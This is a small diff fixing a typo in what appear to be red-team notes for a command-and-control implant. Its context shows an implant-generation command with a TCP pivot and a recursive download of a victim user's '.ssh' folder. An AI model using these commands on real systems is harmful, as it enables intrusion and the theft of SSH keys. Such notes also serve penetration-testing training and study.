@@ -214,7 +214,7 @@ generate --tcp-pivot 172.16.1.100:3006 -a amd64 -o windows -s /home/ubuntu/Docum
 
 * Recursive Download&#x20;
 * **DANGER** -> If you do not set -t \<timeout in seconds> and the default timeout for command occurs then your session will die.
-* If you are downloading a large amount of files ensure you set a long timout to avoid a session being killed
+* If you are downloading a large amount of files ensure you set a long timeout to avoid a session being killed
 
 ```
 download -r 'C:\Users\katwamba\.ssh'
